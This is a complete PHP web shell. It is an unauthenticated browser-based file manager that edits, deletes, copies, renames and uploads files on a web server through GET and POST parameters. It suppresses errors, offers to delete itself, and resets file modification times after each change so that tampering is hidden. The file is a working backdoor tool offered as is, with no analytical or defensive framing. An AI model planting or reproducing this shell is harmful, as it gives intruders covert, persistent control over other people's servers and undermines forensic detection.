<?php
error_reporting (0);
set_time_limit (0);
header('Content-Type: text/html; charset=utf-8');
echo '<html><head><meta charset="UTF-8"><title></title></head><body>';

if (empty ($_GET ['dir'])){
    $dir = getcwd ();
}
else {
    $dir = $_GET ['dir'];
}
chdir ($dir);
$current = htmlentities ($_SERVER ['PHP_SELF'] . "?dir=" . $dir);

echo "Server: " . $_SERVER ['SERVER_NAME'] . "<br>\n";
echo "Current directory: " . getcwd () . "<br>\n";
echo "Software: " . $_SERVER ['SERVER_SOFTWARE'] . "<pre>\n\n</pre>";

echo "<table width = 60%><tr>";
echo "<td><a href = '".$_SERVER ['PHP_SELF']."'>Home</a></td>\n";
echo "<td><a href = '".$current."&mode=create'>Create a new file</a></td>\n";
echo "<td><a href = '".$current."&mode=give'>Give file</a></td>\n";
echo "<td><a href = '".$current."&mode=delself'>Delete self</a></td>\n";
echo "</tr></table><pre>\n</pre>";

$mode = $_GET ['mode'];
switch ($mode){
    case 'edit':
        $file = $_GET ['file'];
        $new = $_POST ['new'];
        if (empty ($new)){
            $text = file_get_contents($file);
            echo "<form action = '".$current."&mode=edit&file=".$file."' method = 'POST'>\n";
            echo "File: ". $file . "<br>\n";
            echo "<textarea name = 'new' rows = '30' cols = '50'>".htmlspecialchars($text)."</textarea><br>\n";
            echo "<input type = 'submit' value = 'Edit'></form>\n";
        }
        else {
            $time = filemtime($file);
            if (file_put_contents($file,$new))
            {
                echo $file . " edited.<p>";
            }
            else {
                echo "Unable to edit " . $file . ".<p>";
            }
            touch($file,$time);
        }
        break;
    case 'delete':
        $file = $_GET ['file'];
        if (unlink ($file)){
            echo $file . " Success!<p>";
        }
        else {
            echo "Error! " . $file . ".<p>";
        }
        break;
    case 'copy':
        $src = $_GET ['src'];
        $dst = $_POST ['dst'];
        if (empty ($dst)){
            echo "<form action = '".$current . "&mode=copy&src=" . $src . "' method = 'POST'>\n";
            echo "Destination: <input name = 'dst' value='$src'><br>\n";
            echo "<input type = 'submit' value = 'Copy'></form>\n";
        }
        else {
            $time = filemtime($src);
            if (copy ($src, $dst)){
                echo "File copied successfully.<p>\n";
            }
            else {
                echo "Unable to copy " . $src . ".<p>\n";
            }
            touch($dst,$time);
        }
        break;
    case 'rename':
        $old = $_GET ['old'];
        $new = $_POST ['new'];
        if (empty ($new)){
            echo "<form action = '".$current . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
            echo "New name: <input name = 'new' value ='$old'><br>\n";
            echo "<input type = 'submit' value = 'Rename'></form>\n";
        }
        else {
            $time = filemtime($old);
            if (rename ($old, $new)){
                echo "File/Directory renamed successfully.<p>\n";
            }
            else {
                echo "Unable to rename " . $old . ".<p>\n";
            }
            touch($new,$time);
        }
        break;

    case 'touch':
        $old = $_GET ['old'];
        $file = $_GET ['file'];
        $new = $_POST ['new'];
        if (empty ($new)){
            echo "<form action = '".$current . "&mode=touch&old=" . $old . "&file=".$file."' method = 'POST'>\n";
            echo "New touch: <input name = 'new' value='$old'><br>\n";
            echo "<input type = 'submit' value = 'Touch'></form>\n";
        }
        else {
            if (touch($file, strtotime($new))){
                echo "Success!<p>\n";
            }
            else {
                echo "Unable! Error! " . $file . ".<p>\n";
            }
        }
        break;

    case 'rmdir':
        $rm = $_GET ['rm'];
        if (rmdir ($rm)){
            echo "Succuss!<p>\n";
        }
        else {
            echo "Unable to rmv " . $rm . ".<p>\n";
        }
        break;

    case 'create':
        $new = $_POST ['new'];
        $time = filemtime($dir);
        if (empty ($new)){
            echo "<form action = '".$current . "&mode=create' method = 'POST'>\n";
            echo "<tr><td>New file: <input name = 'new'></td>\n";
            echo "<td><input type = 'submit' value = 'Create'></td></tr></form>\n<p>";
        }
        else {
            if ($fp = fopen ($new, "w")){
                echo "File created successfully.<p>\n";
                touch($new,$time);
            }
            else {
                echo "Unable to create ".$file.".<p>\n";
            }
            fclose ($fp);
        }
        break;
    case 'delself':
        if (unlink(__FILE__)) echo "Deleted!<p>";else echo "Error! Unable to delete!<p>";
        break;
    case 'give':
        $temp = $_FILES['upload_file']['tmp_name'];
        $file = basename($_FILES['upload_file']['name']);
        $time = filemtime($dir);
        if (empty ($file)){
            echo "<form action = '".$current . "&mode=give' method = 'POST' ENCTYPE='multipart/form-data'>\n";
            echo "Local file: <input type = 'file' name = 'upload_file'>\n";
            echo "<input type = 'submit' value = 'Give'>\n";
            echo "</form>\n<pre>\n\n</pre>";
        }
        else {
            if(move_uploaded_file($temp,$file)){
                echo "File placed successfully.<p>\n";
                unlink ($temp);
                touch($file,$time);
            }
            else {
                echo "Unable to give " . $file . ".<p>\n";
            }
        }
        break;
}

clearstatcache ();

echo "<pre>\n\n</pre><table>\n";
$files = scandir ($dir);

foreach ($files as $file){
    if (!is_file ($file)){
        $items = scandir ($file);
        $time = date("Y-m-d H:i:s",filemtime($file));
        $items_num = count ($items) - 2;
        echo "<tr><td width='300px'><a href = ".$current . "/" . $file.">".$file."</a></td>";
        echo "<td>".$items_num." Items</td>";
        echo "<td><a href = ".$current . "&mode=touch&file=".$file."&old=".urlencode($time).">".$time."</a></td>";
        echo "<td><a href = ".$current . "&mode=rmdir&rm=".$file.">Delete</a>&nbsp;&nbsp;<a href = ".$current . "&mode=rename&old=".$file.">Rename</a></td></tr>\n";
    }
}
foreach ($files as $file){
    if (is_file ($file)){

        $size = round (filesize ($file) / 1024, 2);
        $time = date("Y-m-d H:i:s",filemtime($file));
        echo "<tr><td width='200px'>".$file."</td>";
        echo "<td>".$size." KB</td>";
        echo "<td><a href = ".$current . "&mode=touch&file=".$file."&old=".urlencode($time).">".$time."</a></td>";
        echo "<td><a href = ".$current . "&mode=edit&file=".$file.">Edit</a>&nbsp;&nbsp;";
        echo "<a href = ".$current . "&mode=delete&file=".$file.">Delete</a>&nbsp;&nbsp;";
        echo "<a href = ".$current . "&mode=copy&src=".$file.">Copy</a>&nbsp;&nbsp;";
        echo "<a href = ".$current . "&mode=rename&old=".$file.">Rename</a></td></tr>\n";
    }
}

echo "</table>\n";
?>
